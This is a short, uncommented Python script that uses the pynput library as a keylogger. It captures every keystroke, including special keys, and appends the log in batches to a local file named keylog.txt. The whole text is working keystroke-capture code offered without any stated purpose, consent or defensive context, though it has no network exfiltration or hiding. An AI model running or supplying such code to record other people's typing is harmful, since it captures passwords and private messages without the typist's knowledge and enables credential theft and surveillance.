from pynput import keyboard
import os

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f'[{key}]'
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log)
            log = ""

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()